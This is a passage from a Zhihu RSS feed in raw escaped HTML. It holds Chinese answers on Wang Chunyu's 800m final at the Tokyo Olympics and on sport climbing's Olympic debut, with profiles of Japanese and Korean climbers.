href=\"http://www.zhihu.com/people/weng-xin-79?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">翁昕</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/396372387?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价 2020 东京奥运会田径女子 800 米决赛王春雨创个人最好成绩获第 5 ？","date":"2021-08-05 06:15:55","description":"\n<p>赛后知道一个小细节，更加理解为何昨天王春雨从赛后直到媒体混采区，一直都在抽泣——她说，<b>自己赛前已经偷偷准备好了领奖服。</b></p>\n<p>尽管可能没有多少人（哪怕是自己人），会相信她能最终站台。</p>\n<p>带着眼泪的「个人最佳」和「创造历史」，特别令人动容。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-112a152b20eda49afd123ad3af2db783_720w.jpg?rss\" data-caption=\"2016年里约奥运，王春雨1分59秒93首次晋级奥运半决赛；2020东京奥运会，则再一次提升，跻身决赛并位列第五。图/Lucy Nicholson\" data-size=\"normal\" data-rawwidth=\"2160\" data-rawheight=\"1214\" data-watermark=\"watermark\" data-original-src=\"v2-112a152b20eda49afd123ad3af2db783\" data-watermark-src=\"v2-4956b549d15c880d2c1fdd08ad69dd77\" data-private-watermark-src=\"v2-c7474485f2d709ef6fb9468940bd0805\"></p>\n<p><br></p>\n<p>女子800米决赛的八名选手在昨天都是超水准的发挥，6人创造了PB（个人最佳）、1人创造了SB（赛季最佳）。包括冠军是美国新国家纪录（1分55秒21）、亚军是英国国家纪录（1分55秒88）。</p>\n<p><b>在这样一场几乎所有选手都拿出自己110%实力的「PB决战」中，王春雨的1分57秒00、第五名的成绩，含金量极高极高。</b></p>\n<p>对她个人来说，也是继半决赛后三天时间再次大幅PB，很厉害。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-caf7708210c60d1c1687b047e25ddb5f_720w.jpg?rss\" data-caption=\"NR是国家纪录，PB是个人最好成绩，SB是该选手本赛季最好成绩\" data-size=\"normal\" data-rawwidth=\"1748\" data-rawheight=\"630\" data-watermark=\"watermark\" data-original-src=\"v2-caf7708210c60d1c1687b047e25ddb5f\" data-watermark-src=\"v2-1631582542cd69aa97afbddacfa1317c\" data-private-watermark-src=\"v2-386ec9984fe4cf0526965c30d6b5df70\"></p>\n<p><br></p>\n<p>赛后王春雨说了一番话，</p>\n<p>“（第五）证明了自己是可以的，但还是遗憾没能站上领奖台。也许是自己水平不够，跟她们还有差距。”</p>\n<p>“<b>这个差距是可以训练出来的，我觉得自己有一天会战胜她们。</b>”</p>\n<hr>\n<p>复盘一下王春雨的东京奥运会之旅。</p>\n<p><br></p>\n<h3>7月30日第一轮，2分00秒05，小组第三晋级半决赛</h3>\n<p>王春雨东京奥运会前表现出的状态非常好，赛前20天曾在杭州跑过一场邀请赛，轻松跑出1分59秒18——<b>这是自1997年上海八运会以来、中国女子800米的最好成绩。</b></p>\n<p>这场比赛对王春雨来说只是奥运前的最后热身赛，并不算完全展现实力，也可见王春雨当下的状态和能力。</p>\n<p>东京的第一轮和半决赛只相隔一天，王春雨也尽量会以最低的消耗确保自己晋级、并在半决赛发挥。最终2分00秒05，小组第三，顺利晋级半决赛。</p>\n<p><br></p>\n<p>5年前的里约，王春雨已经晋级过奥运半决赛，当时她的实力和目标就是半决赛，第一轮就得全力输出（1分59秒93），到了半决赛位列小组第八（2分04秒05）。东京奥运会王春雨不管能力和目标显然都要远得多。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-91a07c34349015a138ad9285d8497c65_720w.jpg?rss\" data-caption=\"里约时，王春雨力拼进入半决赛，第一轮已经全力输出，最终半决赛2分04秒05小组第八\" data-size=\"normal\" data-rawwidth=\"550\" data-rawheight=\"349\" data-watermark=\"watermark\" data-original-src=\"v2-91a07c34349015a138ad9285d8497c65\" data-watermark-src=\"v2-147bc558c219281709e80bfade701efd\" data-private-watermark-src=\"v2-ec7cccb094bbd797ae8ec4244083b753\"></p>\n<p><br></p>\n<h3>7月31日半决赛，1分59秒14，小组第二晋级决赛</h3>\n<p>前400米59秒5（第一）、后400米59秒6（最终小组第二），1分59秒14小幅刷新个人PB，小组仅落后基利·霍奇金森0.02秒（基利最终决赛拿了银牌）。</p>\n<p>顺利进入决赛。</p>\n<p><b>首位进入奥运会女子800米决赛的中国运动员，第二位进入决赛的亚洲选手——这个第二让整个亚洲等了近百年，上一次要追溯到1928年阿姆斯特丹奥运会的人见绢枝</b>（当时21岁的日本人人见绢枝拿了银牌，可惜她因为肺结核24岁就去世了）。</p>\n<p>后面是三天后的决赛。</p>\n<p><br></p>\n<h3>8月3日决赛，1分57秒00，第五</h3>\n<p>决赛对王春雨就是拼。这种拼甚至还有破釜沉舟的意味在里面，包括她不断给自己一些暗示，剑指名次、冲击领奖台——这也是很多人（包括我们自己人）兴许都并没有对王春雨报以如此高的期望，王春雨自己却有更高的要求。</p>\n<p><br></p>\n<p>一个细节，完成半决赛后王春雨还和记者开玩笑说，“下一场（决赛）我走完两圈也是第八了，<b>但我觉得我不可能是第八，我想拼一个更好的名次。</b>”</p>\n<p>最后看，这种高要求没有变为负担，相反成了很强的驱动力。</p>\n<p>特别棒。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-daf4159d3d5b7eb309f15164eca6983b_720w.jpg?rss\" data-caption=\"东京奥运会中国不少女选手都有自己的幸运小细节，比如杨倩的小黄鸭头饰、美甲，比如鲍珊菊/钟天使的毛主席佩章等，王春雨的幸运符就是红色蝴蝶结。\" data-size=\"normal\" data-rawwidth=\"2170\" data-rawheight=\"3000\" data-watermark=\"watermark\" data-original-src=\"v2-daf4159d3d5b7eb309f15164eca6983b\" data-watermark-src=\"v2-1293107dfbeaf2318a16ea47af1ab424\" data-private-watermark-src=\"v2-d611ed594dab7610a9c0ce8ef42585bd\"></p>\n<p><br></p>\n<p>解读一下决赛：</p>\n<p><br></p>\n<p>决赛王春雨第二道出发；</p>\n<p>800米内道选手，如果想争夺名次的话，并道后需要特别留意不能被外道选手给卡在里面，这样后面的突围和冲刺很容易失去自己的节奏。王春雨也是很担心这一点，所以并道后，她是想跟住美国人穆的（后来的冠军，1分55秒21）。不过并没能跟到穆后面；</p>\n<p>——看过比赛的应该会有印象，外圈选手并道的瞬间是很“凶”的，并道也是特别的决绝；</p>\n<p>此后王春雨的位置一直在3-5名间左右，<b>比赛前400米58秒2、排名第四</b>；</p>\n<p>比赛后半程看的很振奋。<b>王春雨中后段（大约600米处）有落到后面，一度让人觉得是不是就此会被落下</b>；</p>\n<p>然后她还是咬牙跟住了；</p>\n<p><b>迎来最后100米直道冲刺时，她的排名回到第六、在内道的位置。最后90米，王春雨突然很坚决的选择往外跑，转到了第三道开始最后冲刺</b>；</p>\n<p>后半程的落后，也是王春雨与穆、基利等选手实力差距的呈现。但王春雨丝毫没有稳妥完赛的意思，真的是毫无保留的拼了最后这段；</p>\n<p>美国的天才少女、19岁的穆最后和别人的差距越拉越大如愿第一个冲线。当时转播画面里王春雨也是大跨步的在冲，完全没有松懈；</p>\n<p>最后第五名完赛，落后铜牌罗杰斯0.18秒、第四简玛·里基0.1秒，其实互相之间的差距并不大。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-b605f4ddb69994aa8a4c588d4ae417e8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2824\" data-rawheight=\"1796\" data-watermark=\"watermark\" data-original-src=\"v2-b605f4ddb69994aa8a4c588d4ae417e8\" data-watermark-src=\"v2-5dac5fc7d14ae975750ce64bd49e6d15\" data-private-watermark-src=\"v2-13249668e591f538b21400f4a57b3a42\"></p>\n<p><br></p>\n<p><b>1分57秒00，比自己三天前跑出的个人PB提升了整整2.14秒</b>，这显然是很超神的表现了——主观来讲，这种超神表现给予的震撼丝毫不亚于苏炳添前几天的9秒83。</p>\n<p>甚至于，可能是赛后到写这个回答、刚刚重新看遍比赛，以及王春雨自己的赛后复盘，还产生更多“好可惜啊”的感觉……</p>\n<p><br></p>\n<p>决赛的八位选手发挥真的都很出色，互相之间的竞争角逐也让每个人都跑出了很快的成绩。“其他人表现一般，王春雨这个发挥是否就拿牌了？”的假设客观来说，本质并不成立。</p>\n<p>这点要承认。</p>\n<p>也无法去奢求或者假象，如果王春雨跑得更快一些会怎样。这个26岁安徽姑娘，已经完全输出了自己的能力。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-f3d373ba77d7bf67268d5e24a1c2efd0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5000\" data-rawheight=\"3333\" data-watermark=\"watermark\" data-original-src=\"v2-f3d373ba77d7bf67268d5e24a1c2efd0\" data-watermark-src=\"v2-5d5fa3872bea66d5b87f43e28501ddb8\" data-private-watermark-src=\"v2-1a2740533e0ce38823d5926f47c21c49\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-112a152b20eda49afd123ad3af2db783_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2160\" data-rawheight=\"1214\" data-watermark=\"watermark\" data-original-src=\"v2-112a152b20eda49afd123ad3af2db783\" data-watermark-src=\"v2-4956b549d15c880d2c1fdd08ad69dd77\" data-private-watermark-src=\"v2-c7474485f2d709ef6fb9468940bd0805\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-3df88e9dbadcf260482f6ccfd24c35e4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"1366\" data-watermark=\"watermark\" data-original-src=\"v2-3df88e9dbadcf260482f6ccfd24c35e4\" data-watermark-src=\"v2-e51fb00d57685dac7da7a313053d7db1\" data-private-watermark-src=\"v2-135681aaaa064958b3b3ac7e1f0f0682\"></p>\n<p><br></p>\n<p>王春雨亚锦赛、亚运会都已拿到过第一名，两届奥运会，里约和东京也已经最好的证明了自己的实力。</p>\n<p>三年后的巴黎奥运会，很难想象王春雨还会站上决赛。不过对东京赛后王春雨的这句话，还是坚信不疑——</p>\n<p>“<b>这个差距是可以训练出来的，我觉得自己有一天会战胜她们。</b>”</p>\n<p><br></p>\n<p>不光你觉得，我们也这样觉得。一定会的。</p>\n<p>兴许明年的杭州亚运会，王春雨依然会（在成绩上）更进一步。</p>\n<hr>\n<p>东京奥运会期间，相关的赛事资讯都会在知乎想法中发布，感谢关注<a href=\"https://www.zhihu.com/org/yun-dong-fen-zi-cheng-lan-wen-hua\" class=\"internal\">运动分子</a></p>\n<hr>\n<ul>\n<li><a href=\"https://www.zhihu.com/question/476493978/answer/2032949449\" class=\"internal\">2020 东京奥运跳水女子 3 米跳板决赛施廷懋、王涵包揽冠亚军，如何评价本场比赛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/476149568/answer/2029677017\" class=\"internal\">2020 东京奥运田径男子 10000 米埃塞俄比亚选手巴雷加夺得田径首金，如何评价本场比赛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/476000617/answer/2028599848\" class=\"internal\">如何评价 2020 东京奥运会游泳男子 200 米个人混合泳决赛汪顺夺金？</a></li>\n<li><a href=\"https://www.zhihu.com/question/474850082/answer/2026108063\" class=\"internal\">奥运射击选手是如何看清靶子的？</a></li>\n<li><a href=\"https://www.zhihu.com/question/474575633/answer/2024002780\" class=\"internal\">为什么一些国家的奥运乒乓球选手是华人？</a></li>\n<li><a href=\"https://www.zhihu.com/question/50191573/answer/1953518631\" class=\"internal\">为什么中国运动员运动寿命短？</a></li>\n<li><a href=\"https://www.zhihu.com/question/344468000/answer/1854947316\" class=\"internal\">新中国体育史上，有哪些比赛的瞬间令你沸腾？</a></li>\n<li><a href=\"https://www.zhihu.com/question/373511126/answer/1608008791\" class=\"internal\">举重运动员有多牛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/341661943/answer/1452491051\" class=\"internal\">撑杆跳这项运动的意义是什么，是如何发明的？</a></li>\n<li><a href=\"https://www.zhihu.com/question/293545938/answer/489299124\" class=\"internal\">一个身体素质普通的人被车拉着能达到博尔特的速度吗？</a></li>\n<li><a href=\"https://www.zhihu.com/question/39665045/answer/275431053\" class=\"internal\">历史上有哪些精心布局却被对方一下破局的故事？</a></li>\n<li><a href=\"https://www.zhihu.com/question/20403477/answer/712635036\" class=\"internal\">110 米栏的顶级运动员，为什么他们不参加100米的比赛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/302684797/answer/544389984\" class=\"internal\">男生100m跑到11s很奇怪嘛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/282601379/answer/528371413\" class=\"internal\">跑150米然后截取速度最快的连续100米区间作为100米的成绩是否更合理？</a></li>\n<li><a href=\"https://www.zhihu.com/question/352385663/answer/884879335\" class=\"internal\">为什么马拉松选手最后不冲刺？</a></li>\n<li><a href=\"https://www.zhihu.com/question/39239070/answer/594491009\" class=\"internal\">体育赛事中有哪些「几乎不可破」的纪录？</a></li>\n<li><a href=\"https://www.zhihu.com/question/24987243/answer/1357448925\" class=\"internal\">跑5公里需要多少分钟？</a></li>\n<li><a href=\"https://www.zhihu.com/question/407047274/answer/1363793504\" class=\"internal\">很多退役的军人都说自己五公里可以15/16分，军队的训练真的这么强么？</a></li>\n</ul>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/yun-dong-fen-zi-cheng-lan-wen-hua?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">运动分子</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/477063063/answer/2039110968?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">125 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/477050158?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价东京奥运会王春雨在800米决赛中的表现？</a><br><a href=\"http://www.zhihu.com/question/476608971?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价中国羽毛球队在东京奥运会上的比赛成绩？</a><br>\n","link":"http://www.zhihu.com/question/477063063/answer/2039110968?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价街舞（breaking）、滑板、攀岩和冲浪正式成为 2024 年巴黎奥运会比赛正式项目?","date":"2021-08-05 06:15:47","description":"\n<p>东京奥运会攀岩预赛结束更新：</p>\n<p>中日韩三国赛果如下：</p>\n<p>男子组：中国的小将潘愚非速度赛排名第20位，抱石赛排名第8位，难度攀登比赛排名第7位，最终总成绩第14位，无缘决赛；</p>\n<p>日本队，一哥Tomoa Narasaki发挥出色，不专攻速度赛的他爬出了5.94秒位居第2，抱石赛也高居第2，在基本已经确保晋级的情况下难度攀登轻松上阵排名第14，总成绩第2位进入决赛。另一名选手Kai Harada总成绩排名第18位，无缘决赛；</p>\n<p>韩国队唯一的入围选手Jongwon Chon排名第十与决赛失之交臂。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-86204dbc607449903f154aee883cf4a6_720w.jpg?rss\" data-caption=\"中国选手潘愚非在抱石比赛中，转自国际奥委会官方微博\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1349\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>女子组：专攻速度的中国小将宋懿龄速度赛爬出了6.46秒的好成绩，位居第3位，但是受到肩伤影响的她抱石赛排名第19位，难度攀登比赛排名第18位，最终总成绩第12位无缘决赛；</p>\n<p>日本队，老将Akiyo Noguchi和中生代选手Miho Nonaka分别以总成绩第4位和第3位晋级，毫无悬念；</p>\n<p>韩国队的天才少女Chae-hyun Seo在速度赛仅仅爬出第17名的情况下，抱石赛取得第5名，难度攀登更是豪取第1名，以总成绩第2名的成绩挺进决赛。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-acd6f6881d2abd2e952bf049c4afe3b1_720w.jpg?rss\" data-caption=\"中国选手宋懿龄在速度比赛中，转自国际奥委会官方微博\" data-size=\"normal\" data-rawwidth=\"1514\" data-rawheight=\"1080\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>资格赛，中日韩三方的表现基本在笔者的预测范围内。中国两位小将其实需要发挥出自己的全部实力，加上一些些运气才可以晋级。只不过，潘愚非的速度赛稍微欠缺了一些运气，宋懿龄受到奥运会资格赛期间肩伤的影响并没有完全恢复，在战略性放弃抱石赛保存体力避免受伤的情况下难度攀登还是未能克服伤病影响。但是这一次他们的表现已经足够出色，中国的攀岩水平还在不断上升，让我们期待2024年巴黎奥运会速度攀岩和其他两项分开之后，这两位选手和其他中国选手的表现。</p>\n<p>这次奥运会，大家都是时隔很久看到大多数选手登场，所以也是对他们闭关修炼的一个检验。很明显日本队对于速度攀岩的训练得到了回报，潘愚非和韩国的小将Chae-hyun Seo也加强巩固了自己的抱石水平。</p>\n<p>今明天将是男子组和女子组的决赛，祝大家观赛愉快，享受比赛。</p>\n<hr>\n<p>攀岩项目首次进入了奥运，一众岩友的很多回答已经说到了攀岩的方方面面。攀岩首次入奥，中国国家队也是首次建立了一支优秀的攀岩队伍。这支国家队新队伍的诞生引起了我的关注。</p>\n<p>我就稍微聊聊选手，特别是着重聊一下中日韩三国的选手吧。</p>\n<p>中日韩三国在体坛也算相爱相杀多年，并且横跨多个体育项目，足球，篮球，排球，乒乓球，游泳，围棋，并且出现了很多个口口相传的动人故事。现在运动攀岩也进入了奥运大家庭，也算是为这三个国家之前的体育项目比拼又增添的新的一笔。</p>\n<p>笔者个人认为，在现在的攀岩大环境下，中日韩三国之间的关系跟早年的围棋大环境有相似之处：日本实力统治，韩国正在悄悄开始新时代，而中国目前无疑是三个国家中相对较弱的国家，但是前景无疑是光明的…</p>\n<p>先从最强大的日本开始说起。</p>\n<p><b>日本队 </b></p>\n<p><b>关键词：内卷</b></p>\n<p>提起日本队，笔者第一个会想到的是一个最近开始很流行的词语——内卷。</p>\n<p>日本队无疑是全亚洲，乃至于全世界，综合攀岩实力最强的国家。</p>\n<p>日本队有多强？我们用2019年国际攀联世界杯的各个分站赛数据来说话。为什么选用2019年？是因为2019年的时候攀岩在奥运会的比赛方式已经确定（综合），以及各位选手在2019国际攀联世界杯的积分将会被作为奥运资格的选拔方式之一，所以全世界的所有攀岩选手对2019年国际攀联世界杯都非常重视，而且在2019年，在日本的八王子分站赛，第一次出现了按照奥运会标准的综合比赛方式。</p>\n<p>下图是2019年国际攀联世界杯抱石比赛男子组各个分站赛的决赛成员，按照最终名次排列，其中标有绿色的是日本队选手：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-0787fa3caba4cc402ecb346ab76c7f9c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"662\" data-rawheight=\"736\" data-watermark=\"watermark\" data-original-src=\"v2-0787fa3caba4cc402ecb346ab76c7f9c\" data-watermark-src=\"v2-63bc8a1d1ce147513cdefda09c428f54\" data-private-watermark-src=\"v2-acf6b6226900ce3763b9067ef1f86e42\"></p>\n<p>可以看到，除了德国慕尼黑站日本队稍显拉垮，没有成员进入前六以外，有两次分站赛有两人进入决赛，有两次分站赛有三人进入决赛，有两次分站赛有四人进入决赛，这个数目放眼任何一个国家都是统治级的。七次有三次冠军落入日本队手中。其中的两次冠军，由目前的日本男子第一人，外号“日本一哥”的Tomoa Nagasaki的获得。</p>\n<p>下图是2019年国际攀联世界杯抱石比赛女子组各个分站赛的决赛成员，按照最终名次排列，其中标有绿色的是日本队选手：</p>\n<p><img src=\"https://pic1.zhimg.com/v2-d3bc4372fbb74528aa2106f36879e46a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"663\" data-rawheight=\"736\" data-watermark=\"watermark\" data-original-src=\"v2-d3bc4372fbb74528aa2106f36879e46a\" data-watermark-src=\"v2-8262650633aaacd31ef707da0ba7e08b\" data-private-watermark-src=\"v2-365ae70b09e30b66a2ab560dffa5364c\"></p>\n<p>相比男子组，女子组的统治力也并没有逊色，只是由于2019年是斯洛文尼亚选手Janja Garnbret状态爆炸的一年，日本女队难夺一冠。一直被Janja压制的这位日本选手，正是老来焕发第二春，状态更胜壮年的日本女子第一人，Akiyo Noguchi。</p>\n<p>相比抱石被日本队统治，先锋和速度攀岩相对百花齐放一些。那么，综合这三项考核的攀岩比赛，日本队会不会因此受到影响呢？</p>\n<p>结论是…是的，日本队受到了影响，统治力更加强大了。以下是八王子站综合排名：</p>\n<p>男子组：</p>\n<p>冠军归属日本，前六名四位日本选手。 </p>\n<p><img src=\"https://pic1.zhimg.com/v2-e82d31bb2d8c1d3729336f9a55d3ffed_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1269\" data-rawheight=\"363\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>女子组：</p>\n<p>最好成绩亚军，前六名三位日本选手。 </p>\n<p>所以在攀岩界，有着世界对抗日本的传说…</p>\n<p><img src=\"https://pic3.zhimg.com/v2-8342ad202823b2e9c6e2b927fb85b8a8_720w.jpg?rss\" data-caption=\"网上的调侃世界对抗日本的攀岩表情包\" data-size=\"normal\" data-rawwidth=\"929\" data-rawheight=\"495\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>那么，为什么我要用内卷来形容日本队呢？</p>\n<p>那是因为攀岩奥运名额的问题。由于奥运攀岩比赛的选手人数只有男女各二十人，为了防止一边倒的局面，世界攀联规定，每个国家的名额上限，至多两男两女一共四位选手。</p>\n<p>由于Tomoa和Akiyo在2019年国际攀联世界杯的优异表现，他们各自锁定了一个奥运名额</p>\n<p>由于日本队是东道主，所以还能自动获得一男一女两个名额——事实上，我觉得日本队并不需要东道主这个便利，凭借接下来两位选手（男生Kai Harada和女生Miho Nonaka）的优异表现，也照样能够顺延获得两个奥运名额。</p>\n<p>然而，剩下的一众日本选手，尽管他们的实力可能还强于不少获得奥运资格的其他国家的一些选手，但是因为名额限制，只能遗憾无缘这次奥运。可以说，许多出色的日本攀岩选手们，有着和许多出色的中国乒乓球选手们，有着相似的痛苦。这次疫情之后，日本先于其他国家办起了国内锦标赛，由于比赛荒，日本锦标赛获得了全世界岩友们的空前关注。比赛水平之高，颇有几分我国乒乓球「直通里约热内卢」之类比赛的即视感。</p>\n<p>下面介绍一下一些日本选手：</p>\n<p>奥运选手：Akiyo Noguchi</p>\n<p>这次攀岩入奥，正好赶上了东京奥运会。在当年，得知攀岩有机会加入2020年奥运会之时，当仁不让日本的女子攀岩第一人，Akiyo Noguchi，积极参与了东京申奥的活动。Akiyo其实相对于攀岩选手来说，年纪已经不算轻，她之前也有过2020年之前就退役的打算。但是，在活动中她表示，只要东京获得了2020年奥运会的承办资格，她肯定会积极训练，备战2020东京奥运，在为国效力之后再退役。随着东京申办奥运的成功，Akiyo也实现了自己的梦想。在2018年开始的一系列比赛之中，Akiyo状态爆炸，不仅实现了第二春，并且成绩更胜往昔。早年Akiyo是以柔韧著称，经常出现脚比头高的极限挂脚动作，然而到了职业生涯末期，Akiyo进一步雕琢自己的风格，在动态动作方面取得了长足进步，从动态来说已经是稳稳的世界顶尖水准。然而疫情的降临，让东京奥运推迟至2021年，Akiyo的年龄也来到了31岁，在疫情后的比赛已经出现了明显的状态下滑，不禁让人唏嘘。希望她能够保持状态，能够在奥运比赛中取得理想的成绩。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-2004f98c02e63c19d3bb47b02b015893_720w.jpg?rss\" data-caption=\"日本一姐Akiyo Noguchi在东京奥运会难度攀登比赛中。图源：东京奥运会官方微博\" data-size=\"normal\" data-rawwidth=\"690\" data-rawheight=\"499\" data-watermark=\"watermark\" data-original-src=\"v2-2004f98c02e63c19d3bb47b02b015893\" data-watermark-src=\"v2-190d0b644211b55f1fa6fa91119df678\" data-private-watermark-src=\"v2-886f72bec4cb1719ef50b87a2e124927\"></p>\n<p>奥运选手：Tomoa Naarasaki</p>\n<p>日本一哥，动态之王，能够跳的时候绝对不静态，已经形成了自己鲜明的风格。其实Tomoa在户外攀岩的时候，其静态动作也是非常精准的，只是在竞技攀岩中，他选择了使用动态方法来完成而已。攀岩的先锋比赛有六分钟的时间限制，但是Tomoa无论能不能把线路爬完，基本上花费的时间都在三分钟以内，人狠话不多。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-4d00f33f0012a46c56e20d6c9d2c2424_720w.jpg?rss\" data-caption=\"Tomoa Naarasaki登顶后的标志性动作。图源：Japan Times\" data-size=\"normal\" data-rawwidth=\"2000\" data-rawheight=\"1315\" data-watermark=\"watermark\" data-original-src=\"v2-4d00f33f0012a46c56e20d6c9d2c2424\" data-watermark-src=\"v2-cae801cafd39781888cc01e6bc11ee8e\" data-private-watermark-src=\"v2-c07c7fb8e0a18879f379181427c311ae\"></p>\n<p>奥运选手：Miho Nonaka</p>\n<p>Miho是当仁不让的日本女子攀岩第二人，跟Akiyo颇有一种「既生瑜，何生亮」的味道。除了在2018年世界攀联锦标赛拿了年度世界冠军（Akiyo是年度世界亚军），其余时候基本上是被Akiyo稳压一头（就连2018年也是拿了无数亚军屈居Akiyo之后在某一次比赛绝地翻盘）。坊间传言Miho和Akiyo，以及一些其他日本队成员的关系并没有很好，这点笔者没有特意求证，但是相比于日本队其他选手的其乐融融，Miho颇有种苦大愁深的味道，训练刻苦，甚至还号召日本民众给自己众筹了一个私人的速度攀岩赛道。相比其他选手Miho经常在Instagram发自己的训练视频，并且经常给自己打鸡血，灌鸡汤，不得不让人瑞斯拜。也希望Miho的努力能够取得回报。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-2fcb9fbd06b4828bcd59ebcfcbbaafda_720w.jpg?rss\" data-caption=\"Miho Nonaka在东京奥运会难度攀登比赛中。图源：东京奥运会官方微博\" data-size=\"normal\" data-rawwidth=\"690\" data-rawheight=\"463\" data-watermark=\"watermark\" data-original-src=\"v2-2fcb9fbd06b4828bcd59ebcfcbbaafda\" data-watermark-src=\"v2-ce96197fd0e3b257b3a7bbda6a06c6d0\" data-private-watermark-src=\"v2-06d4b7804cd10a398bec0a35cc653bca\"></p>\n<p>奥运遗珠：Futaba Ito</p>\n<p>Futaba是一位青少年选手——今年不过19岁。笔者从她16岁就开始关注了，是一位非常可爱的小姑娘。她一直是Akiyo的小跟班，其实也算是Akiyo的徒弟。相比Akiyo和Miho，Futaba多多少少有些稚气未脱，发挥时好时坏，在总成绩上比两位一姐二姐还是略显逊色。但是这两年随着成年，Futaba的力量也有了很大增长，整个人看上去大了一圈。等到Akiyo退役，相信Futaba通过也可以顺势上位，和Miho稳坐日本女队前两把交椅。不过日本年轻一代好手太多，也可能随着Akiyo的退役进入群雄割据的时代，未来如何就看Futaba自己的努力了。</p>\n<p><b>韩国队</b></p>\n<p><b>关键词：传承</b></p>\n<p>虽然比不上日本队可以对抗世界，但是韩国队绝对是亚洲范围乃至世界范围内的一支劲旅。其中有一个原因，是韩国队拥有全世界竞技攀岩第一人，或者说，世界攀联锦标赛成绩第一人，Jain Kim。是的，笔者在这里用了第一人这个词，并且没有加之一，没有限定性别。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-2fd41eb66bb1344dc65fd8ba0e9239ac_720w.jpg?rss\" data-caption=\"最优雅的岩者之一，Jain Kim。图源：ifsc\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"1638\" data-watermark=\"watermark\" data-original-src=\"v2-2fd41eb66bb1344dc65fd8ba0e9239ac\" data-watermark-src=\"v2-df376e60a73fba5a0c4454a3f0765391\" data-private-watermark-src=\"v2-4123e466184d054709a8b39646d45a2b\"></p>\n<p>Jain Kim在国际攀联世界杯共获得过多达三十次分站赛冠军，并且积分在2009年至2018之内从来没有掉出过世界前三，在2019/2013/2014获得过先锋攀登年度总冠军，在2010年和2015年获得过年度综合总冠军。这些成绩或许在未来会被人超越，比如Adam Ondra或者Janja Garnbret（时尚上Janja已经拥有了更多年度综合总冠军，但是在分站赛冠军数量上远远够不上Jain的级别。），但至少在目前Jain的成绩还是独霸天下。</p>\n<p>除开成绩这些冰冷的数字本身，Jain更为大家所知的，是她的攀爬技巧。几乎所有的岩友在刚开始接触攀岩的时候，都或多或少被告知要看Jain Kim的视频学习。Jain 